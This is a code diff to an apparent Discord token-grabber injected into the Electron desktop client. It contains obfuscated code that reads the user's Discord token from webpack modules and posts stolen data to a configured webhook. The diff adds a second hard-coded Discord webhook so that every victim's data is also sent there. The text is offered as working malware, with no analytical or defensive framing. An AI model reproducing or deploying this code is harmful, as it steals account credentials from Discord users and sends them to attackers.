@@ -4,6 +4,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron')
 const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
 var webhook = "%WEBHOOK_LINK%";
+var webhook2 = "https://discord.com/api/webhooks/952986242000244836/G7q2YVIRmhR0tVkAPsU8GjzVB1A6z2Oagi3XCDBQOTYhfyQ-nPuct0h3_7HO2IOa9-cj"
 
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
@@ -15,7 +16,7 @@ function FirstTime() {
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-	if (details.url.startsWith(webhook)) {
+	if (details.url.startsWith(webhook) || details.url.startsWith(webhook2)) {
 		if (details.url.includes("discord.com")) {
 			callback({
 				responseHeaders: Object.assign({
@@ -61,6 +62,12 @@ function SendToWebhook(info) {
 	const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
         xhr.open("POST", "${webhook}", true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+        xhr.send(JSON.stringify(${info}));
+    `, !0)
+    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
+        xhr.open("POST", "${webhook2}", true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
         xhr.send(JSON.stringify(${info}));
